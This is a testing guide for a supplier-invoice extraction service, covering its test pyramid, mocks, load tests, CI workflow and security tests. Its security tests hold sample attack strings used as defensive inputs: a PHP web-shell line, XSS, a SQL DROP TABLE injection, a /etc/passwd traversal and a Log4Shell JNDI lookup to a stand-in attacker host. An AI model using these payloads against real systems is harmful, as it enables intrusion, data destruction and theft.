# Testing Guide

## Table of Contents

1. [Testing Strategy](#testing-strategy)
2. [Test Pyramid](#test-pyramid)
3. [Unit Testing](#unit-testing)
4. [Integration Testing](#integration-testing)
5. [End-to-End Testing](#end-to-end-testing)
6. [Performance Testing](#performance-testing)
7. [Security Testing](#security-testing)
8. [Test Data Management](#test-data-management)
9. [Test Automation](#test-automation)
10. [Coverage Requirements](#coverage-requirements)
11. [Testing Best Practices](#testing-best-practices)

---

## Testing Strategy

### Overview

The Supplier Invoice Automation Service employs a comprehensive testing strategy designed to ensure reliability, performance, and security. Our approach follows industry best practices with a focus on early detection of issues and continuous quality assurance.

### Testing Philosophy

- **Shift Left**: Catch issues early in the development cycle
- **Risk-Based**: Focus testing effort on high-risk areas
- **Automated**: Minimize manual testing through automation
- **Continuous**: Integrate testing into CI/CD pipeline
- **Evidence-Based**: Make decisions based on test results and metrics

### Quality Gates

All code must pass through the following quality gates:

1. **Unit Tests**: ≥95% line coverage, all tests passing
2. **Integration Tests**: All API endpoints and service interactions tested
3. **Performance Tests**: Response times within acceptable limits
4. **Security Tests**: No critical vulnerabilities detected
5. **Code Quality**: Linting, type checking, and formatting standards met

---

## Test Pyramid

### Test Distribution

```
    /\
   /  \     E2E Tests (10%)
  /____\    - User workflow validation
 /      \   - Cross-browser compatibility
/________\  - Production-like scenarios

/          \ Integration Tests (30%)
\__________/ - API endpoint testing
             - Service interaction testing
             - External service mocking

/              \ Unit Tests (60%)
\______________/ - Individual function testing
                 - Class and method testing
                 - Edge case validation
```

### Test Categories by Coverage

| Test Type | Coverage Target | Purpose | Tools |
|-----------|-----------------|---------|--------|
| **Unit Tests** | 95% line coverage | Test individual components in isolation | pytest, unittest.mock |
| **Integration Tests** | All API endpoints | Test service interactions | pytest, TestClient |
| **E2E Tests** | Critical user flows | Test complete workflows | pytest, requests |
| **Performance Tests** | Key performance metrics | Validate response times | locust, pytest-benchmark |
| **Security Tests** | All attack vectors | Identify vulnerabilities | bandit, safety |

---

## Unit Testing

### Current Test Structure

```
tests/
├── conftest.py              # Test configuration and fixtures
├── test_api.py              # API integration tests  
├── test_services.py         # Service unit tests
└── test_error_handling.py   # Error handling tests
```

### Service Layer Testing

#### AI Service Tests (`tests/test_services.py`)

**Test Coverage: 9 tests**
- Service initialization (success/failure scenarios)
- Structured data extraction with valid responses
- Error handling (empty responses, invalid JSON, validation errors)
- Circuit breaker integration
- Fallback placeholder verification

```python
# Example: AI Service Success Test
@pytest.mark.asyncio
async def test_get_structured_data_success(self, mock_settings, mock_genai):
    """Test successful structured data extraction"""
    service = AIService()
    test_text = "Invoice #INV-12345\nVendor: Test Vendor\nTotal: $100.50"
    
    result = await service.get_structured_data(test_text)
    
    assert result.invoice_number == "INV-12345"
    assert result.vendor_name == "Test Vendor"
    assert result.total == 100.50
    assert result.currency == "USD"
```

#### OCR Service Tests (`tests/test_services.py`)

**Test Coverage: 6 tests**
- Image text extraction (PNG format)
- PDF text extraction with multi-page handling
- File format validation and error handling
- File not found error handling
- Singleton pattern verification

```python
# Example: OCR Service PDF Test
@pytest.mark.asyncio
async def test_extract_from_pdf_success(self, mock_image_class, mock_fitz, mock_ocr_model_class):
    """Test successful text extraction from PDF"""
    # Setup mocks for PDF processing pipeline
    service = OCRService()
    result = await service.extract_text(temp_path)
    
    assert "--- Page 1 ---" in result
    assert "PDF content line 1" in result
    mock_fitz.open.assert_called_once_with(Path(temp_path))
```

#### Prompt Manager Tests (`tests/test_services.py`)

**Test Coverage: 5 tests**
- Basic prompt generation with invoice text
- Table data integration in prompts
- Empty table data handling
- Template structure validation

### Running Unit Tests

```bash
# Run all unit tests
poetry run pytest tests/test_services.py -v

# Run specific service tests
poetry run pytest tests/test_services.py::TestAIService -v
poetry run pytest tests/test_services.py::TestOCRService -v
poetry run pytest tests/test_services.py::TestPromptManager -v

# Run with coverage
poetry run pytest tests/test_services.py --cov=app.services --cov-report=term-missing

# Run tests with benchmark timing
poetry run pytest tests/test_services.py --benchmark-only
```

### Mocking Strategies

#### External Service Mocking

```python
# AI Service Mocking
@pytest.fixture
def mock_genai(self):
    """Mock google.generativeai module"""
    mock_model = MagicMock()
    mock_response = MagicMock()
    mock_response.text = '{"invoice_number": "INV-12345", "total": 100.50}'
    mock_model.generate_content.return_value = mock_response
    
    with patch('app.services.ai_service.genai') as mock_genai_module:
        mock_genai_module.GenerativeModel.return_value = mock_model
        yield mock_genai_module, mock_model, mock_response

# OCR Service Mocking
@pytest.fixture
def mock_ocr_model(self):
    """Mock Surya OCR model"""
    mock_model = MagicMock()
    mock_model.extract_text.return_value = [
        [MagicMock(text="Sample extracted text")]
    ]
    return mock_model
```

#### Configuration Mocking

```python
@pytest.fixture
def mock_settings(self):
    """Mock settings with valid API key"""
    with patch('app.services.ai_service.settings') as mock_settings:
        mock_settings.google_api_key = "test_api_key"
        yield mock_settings
```

---

## Integration Testing

### API Integration Tests

#### Test Coverage (`tests/test_api.py`)

**Test Coverage: 11 tests**
- Health endpoint functionality
- File extraction success scenarios (PNG, PDF, JPEG)
- Error handling (invalid file types, oversized files, missing files)
- Service error integration (OCR failures, AI service errors)

```python
class TestExtractEndpoint:
    """Integration tests for /extract endpoint"""
    
    def test_extract_endpoint_success_pdf(self, client):
        """Test successful PDF processing"""
        # Create mock PDF file
        fake_pdf_content = b"%PDF-1.4 fake pdf content"
        files = {"file": ("test.pdf", io.BytesIO(fake_pdf_content), "application/pdf")}
        
        with patch('app.api.v1.endpoints.extract_text') as mock_extract:
            with patch('app.api.v1.endpoints.get_ai_service') as mock_ai:
                # Setup mocks
                mock_extract.return_value = "Invoice #12345 Total: $100"
                mock_ai_service = create_mock_ai_service()
                mock_ai.return_value = mock_ai_service
                
                response = client.post("/extract", files=files)
                
                assert response.status_code == 200
                data = response.json()
                assert data["invoice_number"] == "INV-12345"
```

#### Error Handling Integration

```python
def test_extract_endpoint_file_too_large(self, client):
    """Test file size limit enforcement"""
    large_content = b"x" * (11 * 1024 * 1024)  # 11MB
    files = {"file": ("large.pdf", io.BytesIO(large_content), "application/pdf")}
    
    response = client.post("/extract", files=files)
    
    assert response.status_code == 400
    assert "File too large" in response.json()["error"]
```

### Service Integration Tests

#### Cache Service Integration

```python
@pytest.mark.asyncio
async def test_cache_integration():
    """Test cache service with real Redis connection"""
    # Setup test Redis connection
    cache_service = CacheService()
    
    # Test data storage and retrieval
    test_data = {"invoice_number": "INV-12345", "total": 100.50}
    await cache_service.set("test_key", test_data)
    
    result = await cache_service.get("test_key")
    assert result == test_data
```

#### Circuit Breaker Integration

```python
@pytest.mark.asyncio  
async def test_circuit_breaker_integration():
    """Test circuit breaker with AI service"""
    ai_service = AIService()
    
    # Simulate failures to trigger circuit breaker
    for _ in range(6):  # Exceed failure threshold
        with pytest.raises(AiServiceError):
            await ai_service.get_structured_data("test")
    
    # Circuit should now be open
    assert ai_service.circuit_breaker.state == "OPEN"
```

### Running Integration Tests

```bash
# Run all integration tests
poetry run pytest tests/test_api.py -v

# Run specific integration test categories
poetry run pytest tests/test_api.py::TestExtractEndpoint -v

# Run integration tests with real services (requires setup)
poetry run pytest tests/test_api.py --integration

# Run with detailed output
poetry run pytest tests/test_api.py -v -s --tb=long
```

---

## End-to-End Testing

### E2E Test Framework

```python
# tests/test_e2e.py
import pytest
import requests
from pathlib import Path

class TestE2EWorkflows:
    """End-to-end workflow testing"""
    
    @pytest.fixture
    def base_url(self):
        return "http://localhost:8000"
    
    @pytest.fixture  
    def sample_invoice_pdf(self):
        """Load sample invoice PDF for testing"""
        return Path("tests/fixtures/sample_invoice.pdf")
    
    def test_complete_invoice_processing_workflow(self, base_url, sample_invoice_pdf):
        """Test complete invoice processing from upload to response"""
        # Health check
        health_response = requests.get(f"{base_url}/health")
        assert health_response.status_code == 200
        
        # Upload and process invoice
        with open(sample_invoice_pdf, 'rb') as file:
            files = {'file': file}
            response = requests.post(f"{base_url}/extract", files=files)
        
        assert response.status_code == 200
        data = response.json()
        
        # Validate response structure
        required_fields = ['invoice_number', 'vendor_name', 'total', 'currency']
        for field in required_fields:
            assert field in data
            assert data[field] is not None
        
        # Validate data types
        assert isinstance(data['total'], (int, float))
        assert data['total'] > 0
        assert isinstance(data['currency'], str)
```

### Cross-Browser E2E Testing

```python
# tests/test_browser_e2e.py
import pytest
from selenium import webdriver
from selenium.webdriver.common.by import By

class TestBrowserCompatibility:
    """Cross-browser compatibility testing"""
    
    @pytest.fixture(params=["chrome", "firefox"])
    def driver(self, request):
        """Setup browser drivers"""
        if request.param == "chrome":
            driver = webdriver.Chrome()
        elif request.param == "firefox":  
            driver = webdriver.Firefox()
        
        yield driver
        driver.quit()
    
    def test_file_upload_interface(self, driver):
        """Test file upload through web interface"""
        driver.get("http://localhost:8000/docs")
        
        # Find upload section
        upload_section = driver.find_element(By.ID, "operations-default-extract_invoice_text_extract_post")
        upload_section.click()
        
        # Test file upload functionality
        file_input = driver.find_element(By.CSS_SELECTOR, "input[type='file']")
        assert file_input.is_enabled()
```

### Performance E2E Testing

```python
# tests/test_performance_e2e.py
import time
import pytest
import requests
from concurrent.futures import ThreadPoolExecutor

class TestPerformanceE2E:
    """End-to-end performance testing"""
    
    def test_response_time_under_load(self, base_url):
        """Test response times under concurrent load"""
        def make_request():
            start_time = time.time()
            response = requests.get(f"{base_url}/health")
            end_time = time.time()
            return response.status_code, (end_time - start_time) * 1000
        
        # Make 10 concurrent requests
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(lambda x: make_request(), range(10)))
        
        # Validate all requests succeeded
        for status_code, response_time in results:
            assert status_code == 200
            assert response_time < 1000  # Under 1 second
    
    def test_file_processing_performance(self, base_url, sample_files):
        """Test file processing performance with various file sizes"""
        for file_path, expected_max_time in sample_files:
            start_time = time.time()
            
            with open(file_path, 'rb') as file:
                files = {'file': file}
                response = requests.post(f"{base_url}/extract", files=files)
            
            processing_time = (time.time() - start_time) * 1000
            
            assert response.status_code == 200
            assert processing_time < expected_max_time
```

---

## Performance Testing

### Load Testing with Locust

```python
# tests/performance/locustfile.py
from locust import HttpUser, task, between
import os

class InvoiceProcessingUser(HttpUser):
    wait_time = between(1, 3)
    
    def on_start(self):
        """Setup test data"""
        self.test_files = [
            "sample_invoice_small.pdf",
            "sample_invoice_medium.pdf", 
            "sample_invoice_large.pdf"
        ]
    
    @task(10)
    def health_check(self):
        """Health check endpoint (most frequent)"""
        self.client.get("/health")
    
    @task(3)  
    def extract_small_invoice(self):
        """Process small invoice file"""
        self._extract_invoice("sample_invoice_small.pdf")
    
    @task(1)
    def extract_large_invoice(self):
        """Process large invoice file"""  
        self._extract_invoice("sample_invoice_large.pdf")
    
    def _extract_invoice(self, filename):
        """Helper method for invoice extraction"""
        file_path = f"tests/fixtures/{filename}"
        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                files = {"file": file}
                with self.client.post("/extract", files=files, catch_response=True) as response:
                    if response.status_code == 200:
                        response.success()
                    else:
                        response.failure(f"Failed with status {response.status_code}")
```

### Performance Test Execution

```bash
# Run performance tests
cd tests/performance

# Basic load test
locust --host=http://localhost:8000 --users 10 --spawn-rate 2 --run-time 5m

# Stress test
locust --host=http://localhost:8000 --users 50 --spawn-rate 5 --run-time 10m

# Performance test with custom scenarios
locust --host=http://localhost:8000 -f custom_scenarios.py --run-time 15m
```

### Benchmark Testing

```python
# tests/test_benchmarks.py
import pytest
import time
from app.services.ai_service import AIService
from app.services.cache_service import CacheService

class TestBenchmarks:
    """Benchmark critical operations"""
    
    def test_ai_service_response_time(self, benchmark):
        """Benchmark AI service processing time"""
        ai_service = AIService()
        test_text = "Invoice #12345\nVendor: Test Corp\nTotal: $100.00"
        
        async def process_invoice():
            return await ai_service.get_structured_data(test_text)
        
        # Benchmark the operation
        result = benchmark(lambda: asyncio.run(process_invoice()))
        assert result is not None
    
    def test_cache_performance(self, benchmark):
        """Benchmark cache operations"""
        cache_service = CacheService()
        test_data = {"invoice_number": "INV-12345", "total": 100.50}
        
        # Benchmark cache set operation
        benchmark(lambda: asyncio.run(cache_service.set("benchmark_key", test_data)))
```

---

## Security Testing

### Static Security Analysis

```bash
# Security vulnerability scanning
poetry run bandit -r app/ -f json -o security_report.json

# Dependency vulnerability checking  
poetry run safety check --json --output safety_report.json

# Code quality and security linting
poetry run pylint app/ --rcfile=.pylintrc
```

### Security Test Cases

```python
# tests/test_security.py
import pytest
from fastapi.testclient import TestClient
from app.main import app

class TestSecurityValidation:
    """Security-focused test cases"""
    
    def setup_method(self):
        self.client = TestClient(app)
    
    def test_file_type_validation(self):
        """Test file type security validation"""
        # Test potentially malicious file types
        malicious_files = [
            ("malware.exe", b"MZ\x90\x00", "application/octet-stream"),
            ("script.js", b"alert('xss')", "application/javascript"),
            ("payload.php", b"<?php system($_GET['cmd']); ?>", "application/x-php")
        ]
        
        for filename, content, content_type in malicious_files:
            files = {"file": (filename, content, content_type)}
            response = self.client.post("/extract", files=files)
            
            # Should reject with 400 Bad Request
            assert response.status_code == 400
            assert "Invalid file type" in response.json()["error"]
    
    def test_oversized_file_rejection(self):
        """Test file size limits for DoS protection"""
        # Create file larger than 10MB limit
        oversized_content = b"A" * (11 * 1024 * 1024)
        files = {"file": ("large.pdf", oversized_content, "application/pdf")}
        
        response = self.client.post("/extract", files=files)
        
        assert response.status_code == 400
        assert "File too large" in response.json()["error"]
    
    def test_error_information_disclosure(self):
        """Ensure errors don't leak sensitive information"""
        # Test with invalid file to trigger error
        files = {"file": ("test.txt", b"plain text", "text/plain")}
        response = self.client.post("/extract", files=files)
        
        error_response = response.json()
        
        # Error should not contain sensitive paths, API keys, etc.
        assert "api_key" not in str(error_response).lower()
        assert "/home/" not in str(error_response)
        assert "password" not in str(error_response).lower()
    
    def test_request_id_tracking(self):
        """Test request correlation for audit trails"""
        response = self.client.get("/health")
        
        # Should include request ID in headers
        assert "X-Request-ID" in response.headers
        
        # Request ID should be valid UUID format
        import uuid
        request_id = response.headers["X-Request-ID"]
        uuid.UUID(request_id)  # Will raise if invalid UUID
```

### Penetration Testing

```python
# tests/test_penetration.py
class TestPenetrationScenarios:
    """Simulated penetration testing scenarios"""
    
    def test_injection_attempts(self):
        """Test various injection attack vectors"""
        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://attacker.com/evil}"
        ]
        
        for payload in injection_payloads:
            # Test injection in file content
            files = {"file": ("test.pdf", payload.encode(), "application/pdf")}
            response = self.client.post("/extract", files=files)
            
            # Should handle safely without execution
            assert response.status_code in [400, 500]  # Rejected or safely handled
            
            # Response should not contain payload
            assert payload not in response.text
```

---

## Test Data Management

### Test Fixtures

```python
# tests/conftest.py
import pytest
import tempfile
import os
from pathlib import Path

@pytest.fixture
def temp_directory():
    """Create temporary directory for test files"""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)

@pytest.fixture
def sample_pdf_file(temp_directory):
    """Create sample PDF file for testing"""
    pdf_path = temp_directory / "sample.pdf"
    pdf_content = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    pdf_path.write_bytes(pdf_content)
    return pdf_path

@pytest.fixture
def sample_invoices():
    """Sample invoice data for testing"""
    return [
        {
            "invoice_number": "INV-12345",
            "vendor_name": "Acme Corp",
            "total": 100.50,
            "currency": "USD",
            "items": [
                {
                    "description": "Professional Services",
                    "quantity": 1.0,
                    "unit_price": 100.50,
                    "total_price": 100.50
                }
            ]
        },
        {
            "invoice_number": "INV-67890", 
            "vendor_name": "Tech Solutions Inc",
            "total": 2500.00,
            "currency": "USD",
            "items": [
                {
                    "description": "Software License",
                    "quantity": 5.0,
                    "unit_price": 500.00,
                    "total_price": 2500.00
                }
            ]
        }
    ]
```

### Test Data Generation

```python
# tests/data_generators.py
import random
import string
from faker import Faker

fake = Faker()

class InvoiceDataGenerator:
    """Generate realistic test invoice data"""
    
    @staticmethod
    def generate_invoice():
        """Generate single invoice with random data"""
        return {
            "invoice_number": f"INV-{random.randint(10000, 99999)}",
            "invoice_date": fake.date(),
            "vendor_name": fake.company(),
            "vendor_address": fake.address(),
            "customer_name": fake.company(),
            "total": round(random.uniform(100, 5000), 2),
            "currency": random.choice(["USD", "EUR", "GBP"]),
            "items": [
                {
                    "description": fake.catch_phrase(),
                    "quantity": random.randint(1, 10),
                    "unit_price": round(random.uniform(10, 500), 2),
                    "total_price": round(random.uniform(50, 1000), 2)
                }
                for _ in range(random.randint(1, 5))
            ]
        }
    
    @staticmethod
    def generate_batch(count=10):
        """Generate batch of invoice data"""
        return [InvoiceDataGenerator.generate_invoice() for _ in range(count)]
```

---

## Test Automation

### CI/CD Pipeline Integration

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    
    services:
      redis:
        image: redis:7.2-alpine
        ports:
          - 6379:6379
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11.9'
    
    - name: Install Poetry
      run: |
        curl -sSL https://install.python-poetry.org | python3 -
        echo "$HOME/.local/bin" >> $GITHUB_PATH
    
    - name: Install dependencies
      run: poetry install
    
    - name: Run unit tests
      run: |
        poetry run pytest tests/test_services.py -v --cov=app --cov-report=xml
    
    - name: Run integration tests  
      run: |
        poetry run pytest tests/test_api.py -v
      env:
        REDIS_HOST: localhost
        GOOGLE_API_KEY: ${{ secrets.GOOGLE_API_KEY }}
    
    - name: Run error handling tests
      run: |
        poetry run pytest tests/test_error_handling.py -v
    
    - name: Security scan
      run: |
        poetry run bandit -r app/ -f json -o bandit-report.json
        poetry run safety check
    
    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml
```

### Pre-commit Hooks

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.4.0
    hooks:
      - id: trailing-whitespace
      - id: end-of-file-fixer
      - id: check-yaml
      - id: check-json
  
  - repo: https://github.com/psf/black
    rev: 23.3.0
    hooks:
      - id: black
        language_version: python3.11
  
  - repo: https://github.com/pycqa/isort
    rev: 5.12.0
    hooks:
      - id: isort
        args: ["--profile", "black"]
  
  - repo: local
    hooks:
      - id: pytest-unit
        name: Run unit tests
        entry: poetry run pytest tests/test_services.py -v
        language: system
        pass_filenames: false
        always_run: true
```

### Automated Test Reports

```python
# tests/report_generator.py
import json
import pytest
from datetime import datetime

class TestReportPlugin:
    """Generate detailed test reports"""
    
    def __init__(self):
        self.test_results = []
        self.start_time = None
        
    def pytest_runtest_logstart(self, nodeid, location):
        """Log test start"""
        self.start_time = datetime.now()
    
    def pytest_runtest_logfinish(self, nodeid, location):
        """Log test completion"""
        if self.start_time:
            duration = (datetime.now() - self.start_time).total_seconds()
            self.test_results.append({
                "test": nodeid,
                "location": location,
                "duration": duration,
                "timestamp": datetime.now().isoformat()
            })
    
    def pytest_sessionfinish(self, session):
        """Generate final report"""
        report = {
            "summary": {
                "total_tests": len(self.test_results),
                "total_duration": sum(r["duration"] for r in self.test_results),
                "timestamp": datetime.now().isoformat()
            },
            "tests": self.test_results
        }
        
        with open("test_report.json", "w") as f:
            json.dump(report, f, indent=2)
```

---

## Coverage Requirements

### Coverage Targets

| Component | Line Coverage | Branch Coverage | Test Types |
|-----------|--------------|-----------------|------------|
| **API Layer** | ≥90% | ≥85% | Integration, E2E |
| **Service Layer** | ≥95% | ≥90% | Unit, Integration |
| **Error Handling** | 100% | ≥95% | Unit, Integration |
| **Utilities** | ≥90% | ≥85% | Unit |
| **Overall** | ≥95% | ≥90% | All types |

### Coverage Validation

```bash
# Generate coverage report
poetry run pytest --cov=app --cov-report=html --cov-report=term --cov-fail-under=95

# Detailed coverage by module
poetry run pytest --cov=app.services --cov-report=term-missing

# Coverage with branch analysis
poetry run pytest --cov=app --cov-branch --cov-report=html
```

### Coverage Exceptions

```python
# pyproject.toml coverage configuration
[tool.coverage.run]
source = ["app"]
omit = [
    "app/__init__.py",
    "app/config.py",  # Configuration files
    "*/tests/*",      # Test files
    "*/venv/*",       # Virtual environment
]

[tool.coverage.report]
exclude_lines = [
    "pragma: no cover",
    "def __repr__",
    "raise AssertionError",
    "raise NotImplementedError",
    "if __name__ == .__main__.:"
]
```

---

## Testing Best Practices

### Test Organization

#### Test Naming Convention
```python
# Pattern: test_<functionality>_<scenario>_<expected_outcome>
def test_ai_service_initialization_success():
    """Test successful AI service initialization"""
    pass

def test_extract_endpoint_invalid_file_type_returns_400():
    """Test invalid file type returns 400 error"""
    pass
```

#### Test Structure (AAA Pattern)
```python
def test_cache_service_stores_and_retrieves_data():
    """Test cache service can store and retrieve data"""
    # Arrange
    cache_service = CacheService()
    test_key = "test_invoice_123"
    test_data = {"invoice_number": "INV-123", "total": 100.50}
    
    # Act
    asyncio.run(cache_service.set(test_key, test_data))
    result = asyncio.run(cache_service.get(test_key))
    
    # Assert
    assert result == test_data
```

### Test Data Best Practices

#### Realistic Test Data
```python
# Use realistic data that matches production patterns
test_invoice = {
    "invoice_number": "INV-2024-001234",  # Real format
    "vendor_name": "Acme Professional Services LLC",  # Realistic name
    "total": 1247.83,  # Realistic amount with cents
    "items": [  # Multiple items like real invoices
        {
            "description": "Professional Consulting Services - Q1 2024",
            "quantity": 40.0,
            "unit_price": 150.00, 
            "total_price": 6000.00
        }
    ]
}
```

#### Edge Case Testing
```python
def test_ai_service_handles_edge_cases():
    """Test AI service with various edge cases"""
    edge_cases = [
        "",  # Empty string
        " ",  # Whitespace only
        "a" * 10000,  # Very long text
        "Special chars: àáâãäå çćĉčď",  # Unicode
        "Numbers: 123.456.789,00 €",  # Different number formats
    ]
    
    ai_service = AIService()
    
    for test_case in edge_cases:
        # Should handle gracefully without crashing
        try:
            result = await ai_service.get_structured_data(test_case)
            assert result is not None
        except AiServiceError:
            pass  # Expected for some edge cases
```

### Performance Testing Best Practices

#### Response Time Validation
```python
import time

def test_endpoint_response_time():
    """Test endpoint meets response time requirements"""
    start_time = time.time()
    
    response = client.get("/health")
    
    response_time = (time.time() - start_time) * 1000  # Convert to ms
    
    assert response.status_code == 200
    assert response_time < 100  # Under 100ms for health check
```

#### Memory Usage Monitoring
```python
import psutil
import os

def test_memory_usage_under_load():
    """Test memory usage remains stable under load"""
    process = psutil.Process(os.getpid())
    initial_memory = process.memory_info().rss
    
    # Simulate load
    for _ in range(100):
        client.get("/health")
    
    final_memory = process.memory_info().rss
    memory_increase = final_memory - initial_memory
    
    # Memory increase should be reasonable (less than 50MB)
    assert memory_increase < 50 * 1024 * 1024
```

### Debugging Test Failures

#### Detailed Error Logging
```python
import logging

def test_with_detailed_logging():
    """Test with comprehensive logging for debugging"""
    logger = logging.getLogger(__name__)
    logger.info("Starting test with detailed logging")
    
    try:
        # Test logic here
        result = some_operation()
        logger.info(f"Operation result: {result}")
        
        assert result == expected_value
        
    except Exception as e:
        logger.error(f"Test failed with error: {e}")
        logger.error(f"Current state: {get_system_state()}")
        raise
```

#### Test Isolation
```python
def test_isolated_operation():
    """Ensure test doesn't affect other tests"""
    # Save initial state
    initial_state = get_current_state()
    
    try:
        # Perform test operations
        perform_test_operations()
        
        # Test assertions
        assert_test_conditions()
        
    finally:
        # Always restore initial state
        restore_state(initial_state)
```

---

This comprehensive testing guide ensures the Supplier Invoice Automation Service maintains high quality, reliability, and performance standards through systematic testing practices.